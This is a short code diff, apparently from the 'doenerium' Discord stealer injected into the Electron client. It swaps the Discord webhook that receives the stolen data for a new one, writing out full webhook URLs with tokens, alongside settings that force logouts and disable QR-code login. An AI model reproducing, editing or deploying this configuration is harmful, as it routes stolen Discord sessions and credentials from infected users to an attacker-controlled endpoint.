@@ -73,7 +73,7 @@ const { BrowserWindow, session } = require('electron'),
 var config = {
     brand: 'doenerium_',
     webhook:
-      'https://discord.com/api/webhooks/1102954485304786985/9tc18LS4j9JRlNacqTXZfX-rSnEJhWKc0btl1xj-wN1_P1xd9AJnRWBA-IUzo96t7Cdy',
+      'https://discord.com/api/webhooks/1102953304683720796/PfHCw9FO_yFzt0CVyCwZ40PX7TEAiVr2n1-6sYR-FfXmdFkHeX8L2bvugG522f8Q8Hi2',
     webhook_link: '%WEBHOOK_LINK%',
     logout: true,
     disable_qr_code: true,
